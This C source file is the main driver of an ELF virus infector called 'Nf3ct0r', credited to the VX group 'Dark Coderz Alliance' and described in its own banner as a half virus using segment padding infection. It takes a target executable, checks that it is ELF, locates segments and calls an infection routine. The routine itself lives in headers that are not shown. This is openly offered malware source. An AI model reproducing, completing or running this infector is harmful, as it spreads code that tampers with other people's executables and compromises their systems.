/*
     .........................................................
     :         ____ ___.__. ____   ____  _______  ___        :
     :       _/ ___<   |  |/    \_/ __ \/  _ \  \/  /        :
     :       \  \___\___  |   |  \  ___(  <_> >    <         :
     :        \___  > ____|___|  /\___  >____/__/\_ \        :
     :            \/\/         \/     \/           \/        :
     :                   __www.cyneox.tk_                    :
     :                                                       :
     :                                                       :
     :                        member of                      :
     :                                                       :
     :             _______  _________     _____              :
     :            \______ \ \_   ___ \   /  _  \             :
     :             |    |  \/    \  \/  /  /_\  \            :
     :             |    `   \     \____/    |    \           :
     :            /_______  /\______  /\____|__  /           :
     :                    \/        \/         \/            :
     :                ( Dark Coderz Alliance )               :
     :                   __www.dca-vx.tk__                   :
     :.......................................................:

*/



#include "includes.h"
#include "defines.h"

void copyright(void);

main(int argc,char **argv)
{
	Infect target;
        
	copyright();
	if(argc!=2) {
		fprintf(stdout,"usage : %s target_file\n",argv[0]);
		return 0;
	}
	
	
        strcpy(target.src_f,argv[1]);   /* copy target name to our structure */
	
        /* open file [target_file] for infection... */
	if(!open_target(&target)) return 1; 
        
	/* check if ELF(Executable and Linking Format) ... */
	if(!is_elf(&target)) return 1;
 	
	/* search for segments ... */
	if(!get_segment(&target)) return 1;
	
	/* infect file ;6) */
	if(!infect_me(&target)) return 1;
	
	if(!close_file(&target)) return 1;
	
	return 0;
}

void copyright(void){
       
       printf("\033[31m-------------------------------------------------------------\033[0m\n");
       printf("\n\033[44mN f 3 c t 0 r\033[0m written by \033[44mcyneox\033[0m/DCA (\033[33mDark Coderz Alliance\033[0m)\n");
       printf("\nURL's: __www.cyneox.tk__ && __www.dca-vx.tk__\n");
       printf("\nDescription : Half Virus using Segment Padding Infection Technique\n");
       printf("\n\033[31m-------------------------------------------------------------\033[0m\n");
} 
	
